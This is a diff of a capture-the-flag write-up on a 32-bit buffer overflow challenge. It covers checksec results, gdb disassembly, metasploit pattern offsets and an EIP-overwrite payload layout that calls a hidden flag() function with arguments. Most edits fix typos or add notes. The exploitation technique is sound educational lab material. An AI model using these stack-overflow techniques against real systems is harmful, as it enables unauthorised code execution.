@@ -19,7 +19,7 @@ ___
 1-download and unzip the file  to get the binary.
 
 2- static analysis:
-+  with `strings` doesn't reveal much though we can see the usage of the `gets`  therfore we can expect some sort of a buffer overflow
++  `strings` doesn't reveal much though we can see the usage of the `gets`  therfore we can expect some sort of a buffer overflow
 + we can as well run the checksec command and we get these intels:
 ```
     Arch:     i386-32-little
@@ -31,13 +31,16 @@ ___
     RWX:      Has RWX segments
 
 ```
-Return-to-libc is a method that defeats stack protection on linux systems. We know that most of the
-modern Linux systems have stack protection mechanism to defeat execution from stack but this is not the case here.
+:::note
  --> so the stack is executable which is good .
 
  --> NO PIE: it means the program will be loaded at the same memory address every time it's run,This predictability makes certain types of attacks, particularly return-oriented programming (ROP) attacks, easier to execute.
  
  --> we also notice that the file is a 32-bit arch. 
+
+ -> no canary: The canary is a random value generated at the beginning of the program and gets placed on the stack immediately before the return address and other critical control data so if it's modified , that means there's an attempt of buffer overflow exploitation.
+:::
+
 
 3-start the challenge 
 ```shell
@@ -48,7 +51,7 @@ hhiii
 hhiii
 ```
 
-- we can notice that one we type helllllllllo we get it back , so this is were get is used probably.
+- we can notice that once we type hhiii we get it back , so this is were gets is used probably.
 
 4-dynamique analysis:
 
@@ -88,7 +91,7 @@ Non-debugging symbols:
 
 ```
 
-+ we can see quiet the interesting functions mainly (main,flag,vuln,gets)
++ we can see quite the interesting functions mainly (main,flag,vuln,gets)
 
 now let's disasassemble main and see how things work in the background
 
@@ -150,23 +153,26 @@ End of assembler dump.
 
 ```
 + it's pretty obvious that it calls gets which means buffer overflow it possible .
-+ the other thing i notice is that the flag function isn't called anywhere with the normal flow of the programm so i guess the trick would be to oferflow the $eip register to point to the flag function and thus call it intentionally  
++ the other thing i notice is that the flag function isn't called anywhere with the normal flow of the programm so i guess the trick would be to overflow the $eip register to point to the flag function and thus call it intentionally  
 
 let's get going now and do just that , but first we need to find two thing . the address of the flag function , and the offset from our overflow to the flag function as well 
 
 + the first part is easy since we have we have no PIE enabled , we just run `info functions` and we'll find the address
 
 flag()==> 0x080491e2
-now for the next part we need to create a pattern to overflow with and find the exact of offset 
+now for the next part we need to create a pattern to overflow with and find the exact offset 
 
 seems like there's many ways to create offsets mainly i know about :
 + peda-gdb : which is a plugin for gdb just like gef that i'm using here.
++ you can as well use cyclic() with pwntools
 + metasploit pattern creator: 
 
 ♦ to create patter: `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200`
 
 l: is for the length of the pattern we want to create.
 then you debug the program and find the exact value with which the targeted register/address is overwritten with 
+
+
 
 in our case:
 ![overflow](./overflow.png)
@@ -181,7 +187,7 @@ now let's feed this value to the offset to the offset identifier `/usr/share/met
 ╰─○ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 33674132
 [*] Exact match at offset 188
 ```
-nice so the offset is 188, therefore to solve this we need to input 188 character followed by 4 other characters that in hex that when converted to hex construct the hex address of the flag function and we need to input them in little indian format .
+nice so the offset is 188, therefore to solve this we need to input 188 character followed by 4 other characters that in hex construct the address of the flag function and we need to input them in little indian format .
 
 here's a small python code to place all togother:
 
@@ -215,8 +221,7 @@ You know who are 0xDiablos:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
 Hurry up and try in on server side.
 ```
-and upon investigation if we use ghidra we can check that we indeed hit the flag funtion it runs 
-because the outputed text lives in that function :
+and upon investigation if we use ghidra we can check that we indeed hit the flag funtion :
 
 _flag()_
 
@@ -243,7 +248,7 @@ void flag(int param_1,int param_2)
 ```
 but it looks like we've dodged the main code to output the flag , the main reason maybe the fact that we haven't supplied any parameteres in order to enter the IF checks blocks of code .
 
-no how can we do that?? 
+now how can we do that?? 
 
 In many calling conventions arguments are pushed onto the stack in reverse order. This means the last argument is pushed first, and the first argument is pushed last.
 and upon the start of a function call a stack frame is created and is represented this way :
@@ -255,10 +260,12 @@ let's take flag() as an example
 | <center> some return address    |
 | <center> flag args...           |
 
-now that thing are clear we just have to constructe out payload 
+now that thing are clear we just have to constructe our payload 
 which will look like :
+
 `a*188+flag() address+ random return address+arg[1]+arg[2]`
-note that here the return address is supplied as random because it doesn't matter to us 
+
+note that here the return address is supplied as random because it doesn't matter to us though the programm may crash after it prints the flag
 
 + for the arguments that we need to supply we can find them in the disassamble of flag()
 ```asm
@@ -305,7 +312,7 @@ $
 $ 
 [*] Closed connection to 83.136.252.57 port 49324
 ```
-woow we got flag ! after hours and people getting first blood in 3 min 😪
+woow we got flag ! after hours and people getting first blood in 3 min 😪 anyways thanks a loot for steaking till the end and i have you learned something new.
 
 
 referrences:
@@ -317,7 +324,10 @@ referrences:
 + https://web.archive.org/web/20161106210059/https://www.exploit-db.com/docs/28553.pdf
 + https://book.hacktricks.xyz/binary-exploitation/rop-return-oriented-programing
 
-_end_
+# <center>_The end_</center>
+
+
+
 
 
 EXTRA: (IGNORE THIS IF YOU want)
@@ -343,3 +353,5 @@ call sym.vuln
 + you can use the ROPgadget to find gadgets in the binary and chain them .
 + you can check the exact values of hex wiht `printf "%X\n" 0x21524111` for example.
 + you can use pwntools  cyclic(512) and cyclic_find(0x61616178) to find exat offsets as well 
++ Return-to-libc is a method that defeats stack protection on linux systems. We know that most of the
+modern Linux systems have stack protection mechanism to defeat execution from stack but this is not the case here.
